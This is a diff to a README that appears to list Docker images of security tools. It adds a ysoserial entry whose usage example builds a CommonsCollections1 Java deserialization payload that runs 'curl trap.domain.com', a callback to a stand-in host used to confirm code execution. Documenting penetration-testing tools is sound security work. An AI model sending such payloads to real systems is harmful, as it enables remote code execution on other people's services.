@@ -27,6 +27,17 @@ Usage example:
 docker run -it --rm ilyaglow/whatweb -v https://github.com
 ```
 
+### ysoserial
+
+Link: https://github.com/frohoff/ysoserial
+
+Image: `ilyaglow/ysoserial`
+
+Usage example:
+```
+docker run -it --rm ilyaglow/ysoserial CommonsCollections1 'curl trap.domain.com'
+```
+
 ## Misc
 
 ### jq
